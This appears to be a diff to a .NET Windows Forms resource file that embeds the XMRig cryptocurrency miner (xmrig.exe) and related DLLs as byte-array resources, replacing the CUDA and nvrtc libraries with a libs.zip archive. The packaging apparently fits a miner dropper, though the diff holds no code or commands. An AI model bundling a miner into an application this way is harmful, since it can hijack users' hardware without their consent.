@@ -130,16 +130,10 @@
   <data name="Project1" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Project1.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
-  <data name="nvrtc64_101_0" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\nvrtc64_101_0.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
-  </data>
-  <data name="nvrtc_builtins64_101" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\nvrtc-builtins64_101.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
-  </data>
   <data name="xmrig" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\xmrig.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
-  <data name="xmrig_cuda" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\xmrig-cuda.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  <data name="libs" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\libs.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
 </root>
